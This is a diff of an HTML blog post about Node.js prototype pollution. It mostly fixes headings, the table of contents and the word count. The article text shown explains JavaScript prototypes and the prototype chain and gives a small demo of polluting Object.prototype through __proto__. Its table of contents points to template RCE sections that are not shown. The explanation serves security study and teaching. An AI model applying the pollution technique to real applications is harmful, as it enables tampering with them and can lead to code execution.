@@ -11,7 +11,7 @@
   <meta itemprop="name" content="nodejs原型污染">
   <meta itemprop="datePublished" content="2024-08-15T09:31:01+08:00">
   <meta itemprop="dateModified" content="2024-08-15T09:31:01+08:00">
-  <meta itemprop="wordCount" content="1342">
+  <meta itemprop="wordCount" content="1318">
   <meta itemprop="keywords" content="代码审计,Nodejs安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/nodejs%E5%AE%89%E5%85%A8/18/">
   <meta property="og:site_name" content="东隅 Blog">
   <meta property="og:title" content="nodejs原型污染">
@@ -37,7 +37,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/nodejs%E5%AE%89%E5%85%A8\/18\/"
-    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, nodejs安全","wordcount":  1342 ,
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, nodejs安全","wordcount":  1318 ,
     "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/nodejs%E5%AE%89%E5%85%A8\/18\/","datePublished": "2024-08-15T09:31:01+08:00","dateModified": "2024-08-15T09:31:01+08:00","publisher": {
       "@type": "Organization",
       "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
@@ -144,7 +144,7 @@
   <article class="page single">
     <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>Nodejs原型污染</span>
       </h1></div><div class="post-meta">
-      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1342 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-08-15 09:31:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-08-15">2024-08-15</time></span>&nbsp;<span title="1318 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 1400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>7 minutes</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>Contents</span>
@@ -152,24 +152,50 @@
         </div>
         <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li>
+    <li><a href="#构造函数">构造函数</a></li>
+    <li><a href="#原型">原型</a></li>
+    <li><a href="#原型对象">原型对象</a></li>
+    <li><a href="#原型链">原型链</a></li>
+    <li><a href="#function与constructor">Function与constructor</a>
       <ul>
-        <li></li>
+        <li><a href="#objectprototypeconstructor">Object.prototype.constructor</a></li>
+        <li><a href="#function概念">Function概念</a></li>
       </ul>
     </li>
   </ul>
+
+  <ul>
+    <li><a href="#demo1">demo1</a></li>
+    <li><a href="#demo2">demo2</a></li>
+  </ul>
+
+  <ul>
+    <li><a href="#ejs模板rce">ejs模板rce</a></li>
+    <li><a href="#jade">JADE</a></li>
+    <li><a href="#undefsafe-模块原型链污染cve-2019-10795">Undefsafe 模块原型链污染（CVE-2019-10795）</a></li>
+    <li><a href="#审计">审计</a>
+      <ul>
+        <li><a href="#split">split()</a></li>
+        <li><a href="#arrayprototypefilter">Array.prototype.filter()</a></li>
+        <li><a href="#arrayprototypeslice">Array.prototype.slice()</a></li>
+        <li><a href="#arrayprototypejoin">Array.prototype.join()</a></li>
+      </ul>
+    </li>
+    <li><a href="#merge类操作导致原型链污染">Merge类操作导致原型链污染</a></li>
+    <li><a href="#mergerecursivemerge-cve-2020-28499">merge.recursiveMerge CVE-2020-28499</a></li>
+  </ul>
 </nav></div>
-      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h5 id="相关概念" class="heading-element"><span>0.0.0.1  相关概念</span>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h1 id="相关概念" class="heading-element"><span>相关概念</span>
   <a href="#%e7%9b%b8%e5%85%b3%e6%a6%82%e5%bf%b5" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>所有的对象都继承自Object.prototype，包括{ “a”: 1, “b”: 2 }这样的对象。</p>
+</h1><p>所有的对象都继承自Object.prototype，包括{ “a”: 1, “b”: 2 }这样的对象。</p>
 <p>Object.prototype是JavaScript中所有对象的原型对象，它是一个内置的对象，提供了一些通用的属性和方法，比如toString()和hasOwnProperty()等。</p>
-<h6 id="构造函数" class="heading-element"><span>0.0.0.1.1  构造函数</span>
+<h2 id="构造函数" class="heading-element"><span>构造函数</span>
   <a href="#%e6%9e%84%e9%80%a0%e5%87%bd%e6%95%b0" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在JavaScript中，可以使用==构造函数==的方式来定义一个类。构造函数是一个特殊的方法，在创建类的新实例时自动调用，用于初始化对象的属性。</p>
+</h2><p>在JavaScript中，可以使用==构造函数==的方式来定义一个类。构造函数是一个特殊的方法，在创建类的新实例时自动调用，用于初始化对象的属性。</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">function</span> <span style="color:#58a1dd">Foo</span>() {
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">this</span>.<span style="color:#58a1dd">bar</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>
 </span></span><span style="display:flex;"><span>}
@@ -179,11 +205,11 @@
 <p>请注意，与使用<code>class</code>关键字定义类不同，==使用构造函数方式定义的类，每次创建新的实例时，都会为每个实例创建一个新的函数对象==。因此，在具有大量实例的情况下，使用<code>class</code>定义类通常更高效。</p>
 <p>为了简化编写JavaScript代码，ECMAScript 6后增加了<code>class</code>语法，但<code>class</code>其实只是一个语法糖。</p>
 </blockquote>
-<h6 id="原型" class="heading-element"><span>0.0.0.1.2  原型</span>
+<h2 id="原型" class="heading-element"><span>原型</span>
   <a href="#%e5%8e%9f%e5%9e%8b" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>==原型就是一个属性，即prototype属性，这个属性是构造函数的属性==，构造函数时用来制造出对象的。是构造函数制造出来的公共祖先，后面所有的对象都会继承原型的属性与方法。而后面会提到的<code>_proto_</code>是用来查看原型的，是对象的属性。</p>
+</h2><p>==原型就是一个属性，即prototype属性，这个属性是构造函数的属性==，构造函数时用来制造出对象的。是构造函数制造出来的公共祖先，后面所有的对象都会继承原型的属性与方法。而后面会提到的<code>_proto_</code>是用来查看原型的，是对象的属性。</p>
 <p>为何要有原型这个东西？</p>
 <ul>
 <li>使用构造函数方式定义的类，每次创建新的实例时，都会为每个实例创建一个新的函数对象。通过原型的机制，可以避免对象之间重复定义相同的方法，而是将方法定义在原型上以实现方法的共享和继承。</li>
@@ -211,11 +237,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">john</span>.<span style="color:#58a1dd">greet</span>(); <span style="color:#828b96;font-style:italic">// 输出：Hello, my name is John.
 </span></span></span></code></pre></div><p>在上面的例子中，我们定义了一个构造函数 <code>Person</code>，并设置了一个 <code>name</code> 属性。然后，我们通过 <code>Person.prototype</code> 来定义 <code>greet</code> 方法。这样，通过 <code>new</code> 关键字创建的 <code>Person</code> 的实例 <code>john</code> 就==继承==了 <code>greet</code> 方法。</p>
 <p>因此，我们可以在 <code>john</code> 对象上调用 <code>greet</code> 方法，输出一条问候语。</p>
-<h6 id="原型对象" class="heading-element"><span>0.0.0.1.3  原型对象</span>
+<h2 id="原型对象" class="heading-element"><span>原型对象</span>
   <a href="#%e5%8e%9f%e5%9e%8b%e5%af%b9%e8%b1%a1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>每个对象都具有一个特殊属性<code>__proto__</code>（非标准）或者<code>[[Prototype]]</code>，它指向对象的原型对象。实际上可以理解为原型对象和原型是一个东西。只是我们用<code>__proto__</code>的方法访问prototype</p>
+</h2><p>每个对象都具有一个特殊属性<code>__proto__</code>（非标准）或者<code>[[Prototype]]</code>，它指向对象的原型对象。实际上可以理解为原型对象和原型是一个东西。只是我们用<code>__proto__</code>的方法访问prototype</p>
 <blockquote>
 <p>到这里不要犯迷糊，prototype这个属性是构造函数的属性，而这里的<code>__proto__</code>或者<code>[[Prototype]]</code>是对象的属性，可以用它访问原型对象。</p>
 </blockquote>
@@ -235,11 +261,11 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">Object</span>.<span style="color:#58a1dd">getPrototypeOf</span>(<span style="color:#58a1dd">john</span>) <span style="color:#ff636f">===</span> <span style="color:#58a1dd">Person</span>.<span style="color:#58a1dd">prototype</span>); <span style="color:#828b96;font-style:italic">// 输出：true
 </span></span></span></code></pre></div><p>通过 <code>__proto__</code> 或者 <code>Object.getPrototypeOf()</code> 方法，我们可以获取到对象的原型对象。</p>
 <p>需要注意的是，虽然可以直接通过 <code>__proto__</code> 属性访问对象的原型对象，在实际开发中，不推荐直接使用 <code>__proto__</code>，而是使用 <code>Object.getPrototypeOf()</code> 方法，它提供了更好的可读性和兼容性。</p>
-<h6 id="原型链" class="heading-element"><span>0.0.0.1.4  原型链</span>
+<h2 id="原型链" class="heading-element"><span>原型链</span>
   <a href="#%e5%8e%9f%e5%9e%8b%e9%93%be" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><blockquote>
+</h2><blockquote>
 <p>==原型链是一种继承的手段。==</p>
 <p>当前对象 -&gt; 对象的原型 -&gt; 原型的原型 -&gt; &hellip;</p>
 </blockquote>
@@ -293,15 +319,18 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">john</span> <span style="color:#ff636f">instanceof</span> <span style="color:#58a1dd">Person</span>); <span style="color:#828b96;font-style:italic">// 输出：true
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">console</span>.<span style="color:#58a1dd">log</span>(<span style="color:#58a1dd">john</span> <span style="color:#ff636f">instanceof</span> <span style="color:#58a1dd">Student</span>); <span style="color:#828b96;font-style:italic">// 输出：true
 </span></span></span></code></pre></div><p>最后，我们可以通过 <code>john</code> 对象访问到 <code>Person</code> 和 <code>Student</code> 的方法，并且可以使用 <code>instanceof</code> 运算符检查对象之间的继承关系。</p>
-<h6 id="function与constructor" class="heading-element"><span>0.0.0.1.5  Function与constructor</span>
+<h2 id="function与constructor" class="heading-element"><span>Function与constructor</span>
   <a href="#function%e4%b8%8econstructor" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在javascript中，有时会看到大写的Function，这个和小写的function有本质的区别</p>
+</h2><p>在javascript中，有时会看到大写的Function，这个和小写的function有本质的区别</p>
 <p>function 是一个用于定义函数的关键字。</p>
 <p>Function 是代表所有函数的内置原型对象。</p>
-<p>####### Object.prototype.constructor</p>
-<p>理解Function之前，先补充下constructor的概念。</p>
+<h3 id="objectprototypeconstructor" class="heading-element"><span>Object.prototype.constructor</span>
+  <a href="#objectprototypeconstructor" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>理解Function之前，先补充下constructor的概念。</p>
 <p>constructor是一个对象的数据属性，创建对象后，访问constructor属性，可以返回构造该对象的来源，（不是该对象的原型链上级，二者不同），见下面例子：</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#ff636f">var</span> <span style="color:#58a1dd">a</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">1</span>;
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">a</span>.<span style="color:#58a1dd">__proto__</span>
@@ -320,8 +349,11 @@
 <p>2.Number对象的constructor属性和变量a的constructor属性一样，可见本例的a的原型链的上级和constructor属性是包含关系。</p>
 <p>3.Number对象的constructor属性值是Number方法，通过Number方法构造出的b，与a的属性相同，因为constructor属性，可以返回构造该对象的来源。</p>
 <p>==简单的说constructor属性就是告诉你这个对象从哪来的。==</p>
-<p>####### Function概念</p>
-<p>==每一个javascript的function实际上都是Function对象==，在控制台运行如下，返回True</p>
+<h3 id="function概念" class="heading-element"><span>Function概念</span>
+  <a href="#function%e6%a6%82%e5%bf%b5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>==每一个javascript的function实际上都是Function对象==，在控制台运行如下，返回True</p>
 <pre tabindex="0"><code>(function () {}).constructor === Function</code></pre><p>Function是javascript内置的对象，Function用以实现很多基本功能，如Number、toString等。</p>
 <ul>
 <li>Function() constructor</li>
@@ -345,16 +377,16 @@ new Function(arg0, arg1, /* … ,*/ argN, functionBody)
 Function(functionBody)
 Function(arg0, functionBody)
 Function(arg0, arg1, functionBody)
-Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://www.bilibili.com/read/cv20770194?spm_id_from=333.999.0.0 出处：bilibili</code></pre><h5 id="是什么" class="heading-element"><span>0.0.0.2  是什么</span>
+Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://www.bilibili.com/read/cv20770194?spm_id_from=333.999.0.0 出处：bilibili</code></pre><h1 id="是什么" class="heading-element"><span>是什么</span>
   <a href="#%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><p>原型链污染最关键的几个词汇就是：merage、verify、copy</p>
-<h6 id="demo1" class="heading-element"><span>0.0.0.2.1  demo1</span>
+</h1><p>原型链污染最关键的几个词汇就是：merage、verify、copy</p>
+<h2 id="demo1" class="heading-element"><span>demo1</span>
   <a href="#demo1" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// foo是一个简单的JavaScript对象
+</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">// foo是一个简单的JavaScript对象
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//{bar: 1}表示一个简单的 JavaScript 对象字面量，其中 bar 是属性名，1 是属性值。这个对象字面量可以用来创建一个包含单个属性的对象。
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#ff636f">let</span> <span style="color:#58a1dd">foo</span> <span style="color:#ff636f">=</span> {<span style="color:#58a1dd">bar</span><span style="color:#ff636f">:</span> <span style="color:#a6be9d">1</span>}
 </span></span><span style="display:flex;"><span>
@@ -376,21 +408,21 @@ Function(arg0, arg1, /* … ,*/ argN, functionBody) 作者：J_Chanra https://ww
 <p>后来 我们又用 Object类 创建了一个 zoo对象 那么 这个zoo对象 自然也有一个bar属性了</p>
 <p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
 <p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp" alt="image-20230729002254976" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202307290022540.webp?size=large 2x" data-title="image-20230729002254976" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<h6 id="demo2" class="heading-element"><span>0.0.0.2.2  demo2</span>
+<h2 id="demo2" class="heading-element"><span>demo2</span>
   <a href="#demo2" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//所有的对象都继承自Object.prototype，包括{ “a”: 1, “b”: 2 }这样的对象。
+</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">//所有的对象都继承自Object.prototype，包括{ “a”: 1, “b”: 2 }这样的对象。
 </span></span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"></span><span style="color:#58a1dd">object1</span> <span style="color:#ff636f">=</span> {<span style="color:#a6be9d">&#34;a&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">1</span>, <span style="color:#a6be9d">&#34;b&#34;</span><span style="color:#ff636f">:</span><span style="color:#a6be9d">2</span>};
